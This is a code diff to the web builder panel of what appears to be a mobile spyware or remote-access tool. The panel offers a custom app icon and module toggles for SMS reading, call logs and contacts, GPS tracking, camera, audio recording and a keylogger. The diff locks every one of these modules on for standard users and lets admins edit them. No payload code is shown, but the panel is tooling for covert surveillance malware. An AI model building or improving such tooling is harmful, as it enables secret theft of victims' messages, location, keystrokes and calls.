@@ -139,44 +139,48 @@
                                 <label class="form-label">Custom App Icon (PNG)</label>
                                 <input type="file" id="appIconInput" accept="image/png" class="form-input" style="padding: 8px 14px; font-size: 0.82rem;">
                             </div>
-                            <!-- Modular Feature & Permission Toggles -->
-                            <div style="background: rgba(255,255,255,0.03); padding: 14px 16px; border-radius: 14px; border: 1px solid var(--border); display: flex; flex-direction: column; gap: 10px;">
-                                <div style="font-size: 0.8rem; font-weight: 700; color: #fff; display: flex; align-items: center; justify-content: space-between;">
-                                    <span><i class="fas fa-sliders-h text-primary-c me-1"></i> Feature & Module Permissions</span>
-                                    <span style="font-size: 0.68rem; color: var(--text-muted);">Enable/Disable per build</span>
+                            <!-- Module Permissions (RBAC Locked for Standard Users, Configurable by Admin) -->
+                            <div style="margin-top: 14px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px 14px;">
+                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                                    <span style="font-size: 0.78rem; font-weight: 700; color: #fff;">
+                                        <i class="fas fa-sliders-h text-primary-c me-1"></i> Feature & Module Permissions
+                                    </span>
+                                    <span id="moduleLockBadge" class="live-badge" style="font-size: 0.65rem; background: rgba(255, 69, 58, 0.15); color: #ff453a; border-color: rgba(255, 69, 58, 0.35);">
+                                        <i class="fas fa-lock me-1"></i> ADMIN MANAGED
+                                    </span>
                                 </div>
                                 <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
-                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
                                         <span><i class="fas fa-images text-primary-c me-1"></i> Media Gallery</span>
-                                        <input type="checkbox" id="featureGallery" name="feature_gallery" checked style="accent-color: var(--primary); cursor: pointer;">
+                                        <input type="checkbox" id="featureGallery" name="feature_gallery" checked style="accent-color: var(--primary);">
                                     </label>
-                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
                                         <span><i class="fas fa-folder text-primary-c me-1"></i> File Manager</span>
-                                        <input type="checkbox" id="featureFiles" name="feature_files" checked style="accent-color: var(--primary); cursor: pointer;">
+                                        <input type="checkbox" id="featureFiles" name="feature_files" checked style="accent-color: var(--primary);">
                                     </label>
-                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
                                         <span><i class="fas fa-microphone text-primary-c me-1"></i> Audio Recorder</span>
-                                        <input type="checkbox" id="featureAudio" name="feature_audio" checked style="accent-color: var(--primary); cursor: pointer;">
+                                        <input type="checkbox" id="featureAudio" name="feature_audio" checked style="accent-color: var(--primary);">
                                     </label>
-                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
                                         <span><i class="fas fa-camera text-primary-c me-1"></i> Camera Snap</span>
-                                        <input type="checkbox" id="featureCamera" name="feature_camera" checked style="accent-color: var(--primary); cursor: pointer;">
+                                        <input type="checkbox" id="featureCamera" name="feature_camera" checked style="accent-color: var(--primary);">
                                     </label>
-                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
                                         <span><i class="fas fa-map-marker-alt text-primary-c me-1"></i> GPS Tracker</span>
-                                        <input type="checkbox" id="featureLocation" name="feature_location" checked style="accent-color: var(--primary); cursor: pointer;">
+                                        <input type="checkbox" id="featureLocation" name="feature_location" checked style="accent-color: var(--primary);">
                                     </label>
-                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
                                         <span><i class="fas fa-phone-alt text-primary-c me-1"></i> Call Logs & Contacts</span>
-                                        <input type="checkbox" id="featureCalls" name="feature_calls" checked style="accent-color: var(--primary); cursor: pointer;">
+                                        <input type="checkbox" id="featureCalls" name="feature_calls" checked style="accent-color: var(--primary);">
                                     </label>
-                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
                                         <span><i class="fas fa-envelope text-primary-c me-1"></i> SMS Reader</span>
-                                        <input type="checkbox" id="featureSMS" name="feature_sms" checked style="accent-color: var(--primary); cursor: pointer;">
+                                        <input type="checkbox" id="featureSMS" name="feature_sms" checked style="accent-color: var(--primary);">
                                     </label>
-                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
                                         <span><i class="fas fa-keyboard text-primary-c me-1"></i> Keylogger & Apps</span>
-                                        <input type="checkbox" id="featureKeylogger" name="feature_keylogger" checked style="accent-color: var(--primary); cursor: pointer;">
+                                        <input type="checkbox" id="featureKeylogger" name="feature_keylogger" checked style="accent-color: var(--primary);">
                                     </label>
                                 </div>
                             </div>
@@ -342,6 +346,41 @@
                 const adminBtn = document.getElementById('adminPanelBtn');
                 if (adminBtn) {
                     adminBtn.style.display = window.isUserAdmin ? 'inline-flex' : 'none';
+                }
+
+                // Handle Builder Feature & Module Checkbox Access Control
+                const moduleBadge = document.getElementById('moduleLockBadge');
+                const canEditModules = window.isUserAdmin || window.userPermissions.edit_modules === true;
+                const moduleInputs = document.querySelectorAll('.module-perm-label input[type="checkbox"]');
+                
+                if (canEditModules) {
+                    if (moduleBadge) {
+                        moduleBadge.innerHTML = '<i class="fas fa-check-circle me-1"></i> UNLOCKED';
+                        moduleBadge.style.background = 'rgba(48, 209, 88, 0.15)';
+                        moduleBadge.style.color = '#30d158';
+                        moduleBadge.style.borderColor = 'rgba(48, 209, 88, 0.35)';
+                    }
+                    moduleInputs.forEach(input => {
+                        input.disabled = false;
+                        input.style.cursor = 'pointer';
+                        input.parentElement.style.cursor = 'pointer';
+                        input.parentElement.style.opacity = '1';
+                    });
+                } else {
+                    if (moduleBadge) {
+                        moduleBadge.innerHTML = '<i class="fas fa-lock me-1"></i> ADMIN LOCKED';
+                        moduleBadge.style.background = 'rgba(255, 69, 58, 0.15)';
+                        moduleBadge.style.color = '#ff453a';
+                        moduleBadge.style.borderColor = 'rgba(255, 69, 58, 0.35)';
+                    }
+                    moduleInputs.forEach(input => {
+                        input.checked = true; // Default standard modules checked
+                        input.disabled = true; // Locked so regular user cannot change
+                        input.style.cursor = 'not-allowed';
+                        input.parentElement.style.cursor = 'not-allowed';
+                        input.parentElement.style.opacity = '0.75';
+                        input.parentElement.title = 'Module configuration locked for standard accounts. Full modules active.';
+                    });
                 }
             });
 
